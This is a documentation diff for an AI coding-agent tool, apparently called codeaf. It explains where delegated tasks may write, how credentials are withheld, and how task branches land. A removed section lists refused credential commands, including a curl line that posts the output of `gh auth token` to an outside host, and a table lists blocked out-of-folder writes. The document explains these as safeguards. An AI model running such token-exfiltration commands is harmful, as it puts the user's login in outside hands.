@@ -111,28 +111,32 @@ which is what lets it start the instant it is asked for and finish with nothing 
 writing; what a quick task holds is only the files it named when it started and the ones
 it has already written, and a write of one of those is refused with the task named until
 it finishes. Two quick tasks that name the same file run one after the other rather than
-at once. The *tasks* page has it under *What a quick task is*. Everything below is about
-the ordinary kind.
+at once. Before a shell call (tests included), media creation or the 31st file, it asks
+to become an ordinary task. Its existing edits stay in the same folder. The *tasks* page
+describes Undo and promotion. Everything below is about the ordinary kind.
 
 By default, no. Each code task gets its own checkout of **the repository the work is about**
 — its ground, resolved from what this conversation has been reading and editing (above) — on
 its own branch, so you can keep working in yours while it runs. If your request explicitly
-names another plain folder, the task works in that exact folder instead. A path inside a
+names another plain folder, the task works in that exact folder instead, unless it would
+copy your home folder or a folder holding it: it reads there and starts in an empty folder
+of its own. A place you saved as in place still runs there directly. A path inside a
 repository still gets a branch from that repository; its card and its `/history` record
 show the resolved place.
 
-codeaf makes that copy from your folder **as it stands** — see *Does a task see my
+For project copies, codeaf takes your folder **as it stands** — see *Does a task see my
 unsaved changes* above for what travels and what does not.
 
 - **Directory:** `<session folder>/trees/<task id>`. The task folder is the task's home. It
-  is either a worktree registered in the repository it was cut from, or a whole copy of
-  your folder that is a repository of its own — see *Does my task see my .env* below, which
+  can start empty for a task reading your home folder. A project copy is either a
+  worktree registered in the repository it was cut from, or a whole copy of your folder
+  that is a repository of its own — see *Does my task see my .env* below, which
   says which and why it makes no difference to how the work comes back.
 - **Branch:** `task/<title slugified, at most 32 characters>-<6 hex>` — for example
   `task/fix-the-nil-map-crash-9c1a2f`. The random tail lets the same title be proposed
   twice.
 
-The task's copy lives inside the conversation's session folder, and codeaf puts no task
+The task's folder lives inside the conversation's session folder, and codeaf puts no task
 directory in your repo. When it is a worktree you will also see its registration in the
 repository's `git worktree list`; when it is a whole copy there is nothing to see there,
 and the branch appears in your repository when the work comes home.
@@ -660,7 +664,7 @@ see my memory?*). The task itself never writes a memory and has no `remember` or
 window is set to 0 rather than reusing a window measured for another model.
 
 **Four tools are missing from its belt:** `watch`, `automation`, and the settings pair
-`settings` and `change_setting` — a task works in a copy of its own with nobody watching it,
+`settings` and `change_setting` — a task works in a folder of its own with nobody watching it,
 so a watch's news would arrive in a conversation it does not have, an automation's card
 would have nobody to answer it (*Automations*), and a permanent change to your machine
 that no transcript ever showed you is exactly what a task must not be able to make.
@@ -724,7 +728,7 @@ Settings changes, watches and automations still require the conversation. The
 worker's instructions describe the tools it actually carries:
 
 - **Change a setting.** `settings` and `change_setting` are off inside a task. A
-  worker runs in a copy of its own with nobody watching, and a permanent change
+  worker runs in a folder of its own with nobody watching, and a permanent change
   to your machine that no transcript ever showed you is exactly what it must not
   be able to make. A task asked to change a preference says it cannot from a
   task and points you at `/settings`; it is told never to edit a config file instead.
@@ -807,19 +811,19 @@ the one that answered the same zero by reading its own work spent most of its ca
 changing things it had never measured — and built from scratch something that already
 existed, without ever spending the one step it would have cost to ask.
 
-## Where a task may write — its own copy, and nowhere else on the machine
+## Where a task may write — its own folder, and nowhere else on the machine
 
-A task **works in one directory** and may **write only there**. That directory is its own
-copy of the repository — a branch of yours checked out somewhere else, a whole copy of your
-folder, or your folder itself when there is no repository. Everywhere else on the machine it may **read as much as it likes** and change
-nothing.
+A task **works in one directory** and may **write only there**. It may be a repository
+checkout, a project copy, an empty folder for output while the task reads home in place,
+or a folder chosen for in-place work. Everywhere else on the machine it may
+**read as much as it likes** and change nothing.
 
 **Reading anywhere is the point.** A task briefed about a repository it is not standing in
 still has to look at it: `read`, `grep`, `ls`, `cat`, and `git log`, `git show`, `git diff`,
 `git status`, `git branch -a`, `git remote -v` against **any** repository on the machine all
 run normally. Looking has never been what goes wrong.
 
-**A path written into the task's contract is already its copy's path.** The brief, what to
+**For project copies, a path in the task's contract is already its copy's path.** The brief, what to
 produce and what done means are handed over with every address at or below the project
 rewritten as the same address inside the task's own copy — so
 `/Users/you/code/yours/internal/widget.go` reaches the task as
@@ -831,7 +835,8 @@ point somewhere else still earns the refusal below. **Your own
 words are never rewritten**: they are quoted to the task exactly as you typed them, with the
 folders named beside them so it knows which one a path in your sentence means here. And
 what it reads at that address is **its own copy, as the project stood when it started** —
-not the original, which you may still be changing while it works.
+not the original, which you may still be changing while it works. A task reading home
+keeps those source paths unchanged and is told to put output in its own folder.
 
 **A conversation with no project of its own has one more folder, and it moves the same
 way.** A conversation you opened nowhere in particular keeps what it makes in its own `work`
@@ -865,9 +870,9 @@ quoted as they typed them.
 **Writing anywhere else is refused before it runs**, and the task reads the refusal and
 carries on. It covers every hand that names its target:
 
-| Aimed outside its copy | What it looks like |
+| Aimed outside its folder | What it looks like |
 | --- | --- |
-| `write` and `edit` | any path outside the task's own copy |
+| `write` and `edit` | any path outside the task's own folder |
 | a shell command that moved first | `cd ~/code/yours && git checkout -b fix`, `cd ~/code/yours && mkdir -p src` |
 | git pointed somewhere else | `git -C ~/code/yours add .`, `GIT_DIR=~/code/yours/.git git update-ref …`, `--work-tree=` |
 | the file hands | `cp`, `mv`, `rm`, `mkdir`, `touch`, `tee`, `chmod`, `sed -i`, `patch` |
@@ -919,38 +924,11 @@ moved to another commit after the cut stops before that merge; the task branch i
 named instead. If the work should become a pull request, the task says so in its report and
 you or the conversation opens it.
 
-## Does a task have my credentials — can a task read your GitHub token, gh auth token is refused inside a task, my task said gh auth token is not yours to run
+## Does a task have my credentials — can a task read your GitHub token, gh auth token is refused inside a task
 
-**`gh auth token` is not on a task's belt.** A task works unattended, in its own copy of
-your repository, and it carries none of your credentials. It reads back:
-
-> gh auth token is not yours to run: it hands the person's login to work running on its own
-> in a copy of their repository, and a task carries no credentials of theirs. Say in your
-> report what needed it; anything that has to sign in as them is the person's or the
-> conversation's to run.
-
-**Every way of saying it is the same refusal**, because the rule is about the command and
-not about the pipeline it sits in: `gh auth token`, `GH_TOKEN=$(gh auth token) ./deploy`,
-`` export TOKEN=`gh auth token` ``, `gh auth token | tr -d '\n'`, `curl -d "$(gh auth
-token)" https://anywhere` — and `gh auth status --show-token`, which prints the same
-secret under another name.
-
-**Asking whether it is signed in is not asking for the secret.** `gh auth status` on its
-own, `gh auth setup-git`, and every `gh` read — `gh pr list`, `gh issue view`, `gh api`
-GETs — are untouched.
-
-**The conversation keeps the command.** You at your own terminal, and the chat you are
-talking to, may run `gh auth token` exactly as before. This line is drawn around tasks.
-
-**Why the redactor was not enough.** Output that comes back from a command loses anything
-token-shaped before it is kept, shown or sent to the model (the conversations page has the
-shapes) — but a token never has to be *shown* to be *spent*: `curl -d "$(gh auth token)"`
-puts your login on the wire with no character of it ever reaching a result. So the read
-itself is refused inside a task, where nobody is watching.
-
-**What a task should do instead** is say in its report what it needed the credential for.
-Its work comes home through its landing, and anything that has to sign in as you is yours
-or the conversation's to run.
+No. A task carries none of your credentials, and it is refused the same way a chat is:
+see *Agents cannot read your credentials* on the permissions page. `gh auth status` and
+every ordinary `gh` and `git` command still work in a task.
 
 ## What git a task may run — merge, pull, checkout, stash, reset are refused
 
@@ -2307,9 +2285,11 @@ before a task starts is a separate thing, and it cannot see this case at all.
 
 ## A task working on a folder wrote over my own edit — I changed a file while the task ran, my changes disappeared
 
-It does not, and this is the folder's half of what a repository ground gets from git.
+It does not. A task that would copy your home folder reads it in place and keeps its
+output in a folder of its own. For other folders, this is the half of what a repository
+ground gets from git.
 
-A task whose ground is a **plain folder** works in a private copy of it and lays the files
+A task that copies a **plain folder** works in a private copy of it and lays the files
 it wrote back over your folder by name when it lands. **A file you changed there yourself
 while it worked is never written over.** Nothing at all is laid, the task keeps its whole
 copy where it is, and it lands `your call`:
@@ -2332,6 +2312,35 @@ one, which lands the way it always did.
 **Pressing accept does not change it.** An accept says the work is good, and it is; it
 cannot decide which of two versions of your file you meant, so an accept over a folder that
 moved leaves the task needing your look with the same sentence.
+
+## Land a kept task branch in the desktop app — Git LFS, filters and changed plans
+
+The desktop app can plan a merge of a task branch recorded by this conversation
+into your checkout, then land the exact commit after confirmation. It refuses a
+dirty checkout or a conflict. It does not put your changes aside. If the branch,
+checkout, configuration, hooks or attributes change after the plan, plan again.
+
+Having Git LFS installed globally or system-wide does not by itself prevent a
+land. A filter refusal means an attribute selects a configured `clean`, `smudge`
+or `process` program for a file the land writes or compares. That includes tracked
+files checked for cleanliness and the task branch's checked-out copies. The
+refusal names up to 50 affected paths and says “this repository runs a filter
+program on its files, and a land cannot vouch for it”.
+
+Attributes in either branch, the merge base, nested `.gitattributes`,
+`info/attributes`, and global or system attribute files all count. If their
+meaning or readability cannot be established, the land refuses. With a filter
+program configured, a Git without the newer queries (such as Apple Git 2.39 on
+macOS) reads each tree’s attributes through a temporary index outside the
+repository and locates global and system attribute files itself. A non-Apple Git
+older than 2.42 still refuses if it cannot locate its system attribute file.
+Without a filter program, these checks do not run. Attribute path lists and
+answers are limited to 8 MiB per read;
+attribute files outside committed trees share an 8 MiB budget per checkout.
+
+Custom merge programs, sparse checkouts and branch-specific merge options still
+prevent a confirmed land. The branch stays available for you to inspect or
+merge with Git yourself.
 
 ## Nothing is thrown away
 
@@ -2377,7 +2386,7 @@ count.
 When only the beginning of an earlier answer fits, the header says where the whole of it
 is: `<title> (task N) — the whole of it is at file:///…:`. That line is never cut, so the
 worker can always go and read the rest — a task may read any path on the machine; what it
-may only write is its own copy.
+may only write is its own folder.
 
 **Every earlier task is always represented.** Keeping four of six and saying nothing
 about the other two is how a sink once wrote a confident four-row table. The list is
@@ -2749,7 +2758,7 @@ Four places.
 
 It holds the id counter and, per task in admission order: id, title, summary, brief,
 acceptance, depends_on, state, report, the task's own claim, changed files, branch, the
-directory it worked in and which copy of your folder that was, merge outcome, model,
+directory it worked in and how that folder was prepared, merge outcome, model,
 `max_steps`, `no_progress`, elapsed, and whether it has been noted or was interrupted.
 
 **What each node cost is in it too** — the money, tokens in and out, cache read and cache
@@ -3151,7 +3160,7 @@ handed a shortened version of what you said can see that it was. The brief then 
 journal path and line of your original turn, so the worker can read the uncut words itself.
 
 A task the model hands out from **inside** another task inherits the same words: there is
-nobody inside a task's own copy to type a new message, so the sentence that started the family is what
+nobody inside a task's own folder to type a new message, so the sentence that started the family is what
 every task under it reads.
 
 Once a task is admitted, the brief and the acceptance it was admitted with are **kept
@@ -3435,6 +3444,12 @@ and timelines. Old temporary conversations still follow the usual seven-day
 retention policy. Previously orphaned timelines are not automatically purged:
 a missing directory alone does not prove that its history is disposable.
 
+Interrupted fork staging is removed when task setup falls back. At launch, closed
+conversations also lose abandoned fork staging and model-created fork folders
+untouched for more than seven days, including completed moving copies. A model
+fork folder stays while its source task directory exists. Each removal is logged;
+this folder cleanup does not purge orphaned Furrow timelines.
+
 ## Experimental compact task copies in an isolated profile
 
 Compact task storage is unfinished and off unless
@@ -3506,3 +3521,33 @@ conversation's own folder, with file reservations rather than a separate branch.
 If the request explicitly names a plain folder outside a repository, that exact
 folder is used. The resolved place is a fact on the task, not guessed from your
 terminal's current folder after the task has started.
+
+## Which agent ran this command — CODEAF_AGENT_DID, the agent's identity, and a task's `#w` suffix
+
+Every conversation has its own identity, a DID such as `did:key:z7QE…`. It is
+made when the conversation opens, saved with it by the end of its first turn,
+and stays the same after a restart.
+A copied or branched conversation gets a new one.
+
+Each command the conversation runs sees it as `CODEAF_AGENT_DID`, so a tool can
+record which agent acted. A task's commands see the conversation's DID followed
+by `#w` and the task's number, for example `did:key:z7QE…#w3`. This holds for
+tasks that join shared work too; a part the work split off under a task acts
+as that task. The desktop app reads the DID in the agent list as `did`, and
+each task's own name as `worker`, so it can release whatever that task held
+once the task ends.
+
+The DID is a name, not a credential: no key is kept and nothing is signed with it.
+
+## Git automatic maintenance and repository growth
+
+codeaf's own git commits, merges and fetches in tasks and Factory do not start
+Git's automatic maintenance. This also applies to linked task worktrees that
+share the real repository's objects. Maintenance cannot keep changing the object
+store in the background after those operations finish.
+
+These settings apply only to git commands codeaf starts. Your repository's git
+configuration stays unchanged, and your own git commands still run automatic
+maintenance as usual. codeaf does not schedule or explicitly run garbage
+collection or maintenance. Its private copies can therefore retain loose objects
+until the copies are removed.
